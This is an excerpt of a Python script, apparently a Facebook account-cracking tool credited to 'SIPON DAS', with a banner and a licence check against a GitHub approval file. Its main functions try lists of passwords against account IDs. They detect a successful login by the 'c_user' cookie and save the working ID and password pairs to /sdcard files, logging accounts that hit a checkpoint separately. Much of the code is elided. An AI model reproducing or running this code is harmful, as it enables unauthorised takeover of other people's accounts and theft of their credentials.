...
def SIPONALWAYSONFIRE():
  uuid = str(os.geteuid()) + str(os.getlogin())
  id = "᯾".join(uuid)
  server = requests.get(f'https://github.com/bk-hunter/Sarmin/blob/main/Approval.txt').text
...
\033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
 ...
 Github    : BANTUBD
 Facebook  : SIPON DAS
 Tool Name : \033[1;36mBMW\033[1;37m
 Tool Type : \033[1;31mTRIAL\033[1;37m
...
def ckx():
	...
	server = requests.get(f'https://github.com/bk-hunter/Sarmin/blob/main/Approval.txt').text
	try:
		httpCaht = requests.get(f"https://github.com/bk-hunter/Sarmin/blob/main/Approval.txt").text
		if id in httpCaht:
			msg = str(os.geteuid())
			pass
		else:
...
def m1(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write(f'\r\r\033[1;37m [SIPON] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        SIPON=session.cookies.get_dict().keys()
                        if "c_user" in SIPON:
                                coki=session.cookies.get_dict()
                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                print(f'\r\r\033[1;32m [SIPON\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/SIPON•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SIPON:
                                if 'y' in pcp:
                                        print(f'\r\r\x1b[38;5;208m [SIPON•CP] '+ids+' • '+pas+'\033[1;97m')
                                        open(f'/sdcard/SIPON•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SIPON:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/SIPON•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SIPON:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SIPON:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/SIPON•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SIPON:
                                if 'y' in pcp:
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in SIPON:
                                ...
                                #cek_apk(session,coki)
                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
                                open(f'/sdcard/SIPON•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in SIPON:
                                if 'y' in pcp:
